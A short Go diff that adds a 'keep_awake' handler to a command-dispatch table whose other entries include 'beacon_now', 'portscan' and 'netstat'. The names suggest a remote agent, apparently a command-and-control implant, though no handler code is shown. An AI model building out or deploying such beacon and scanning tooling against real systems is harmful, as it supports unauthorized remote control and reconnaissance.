@@ -37,6 +37,7 @@ func init() {
 		"beacon_now":        handleBeaconNow,
 		"watchdog_start":    handleWatchdogStart,
 		"watchdog_stop":     handleWatchdogStop,
+		"keep_awake":        handleKeepAwake,
 		"services":          handleServices,
 		"portscan":          handlePortscan,
 		"netstat":           handleNetstat,
